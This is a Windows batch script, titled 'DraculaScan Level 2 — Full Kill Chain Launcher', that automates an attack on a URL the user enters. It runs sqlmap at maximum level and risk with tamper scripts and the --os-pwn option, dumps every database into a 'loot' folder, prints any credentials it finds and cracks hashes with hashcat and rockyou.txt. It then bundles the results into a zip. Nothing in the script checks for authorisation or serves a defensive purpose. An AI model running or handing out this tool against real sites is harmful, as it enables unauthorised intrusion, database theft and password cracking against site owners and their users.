@echo off
title 🦇 DraculaScan Level 2 — Full Kill Chain Launcher
color 0C

:: Prompt for target URL
set /p target_url=Enter target URL (e.g., https://example.com/index.php?id=1): 

:: Set output directory
set output=loot\%random%
mkdir "%output%"

:: Phase 1 - Recon and Crawl
echo [*] Phase 1: Crawling and Recon...
sqlmap.py -u "%target_url%" --crawl=3 --level=5 --risk=3 --random-agent --batch --forms --technique=BEUSTQ --tamper=space2comment --output-dir="%output%" --flush-session --threads=6 --os-pwn --dbs

:: Phase 2 - Dump All Found Databases
echo [*] Phase 2: Dumping full data...
sqlmap.py -u "%target_url%" --dump-all --random-agent --batch --threads=6 --tamper=space2comment --output-dir="%output%"

:: Phase 3 - Parse Credentials and Try Login Simulation
echo [*] Phase 3: Parsing for credentials and testing...
if exist "%output%\credentials.txt" (
    echo [✔] Found credentials in dump:
    type "%output%\credentials.txt"
    echo [!] Simulating login attempts using parsed credentials...
    :: simulate login (placeholder - manual step or future integration)
) else (
    echo [!] No credentials.txt found, skipping simulation.
)

:: Phase 4 - Crack hashes if hashdump exists
echo [*] Phase 4: Starting Hashcat cracking...
if exist hashdump.txt (
    hashcat -m 0 -a 0 hashdump.txt rockyou.txt -o cracked.txt
) else (
    echo [!] No hashdump.txt found. Skipping cracking phase.
)

:: Phase 5 - Screenshot pages with Curl (Windows simple grabber)
echo [*] Phase 5: Capturing screenshots...
echo URL: %target_url% > "%output%\target_url.txt"
curl "%target_url%" -o "%output%\screenshot_raw.html"

:: Phase 6 - Package Results
echo [*] Phase 6: Packaging results...
powershell -Command "Compress-Archive -Path '%output%\*' -DestinationPath 'DraculaKillChain_Report.zip'"

echo [✔] All phases complete. Your report is in DraculaKillChain_Report.zip
pause
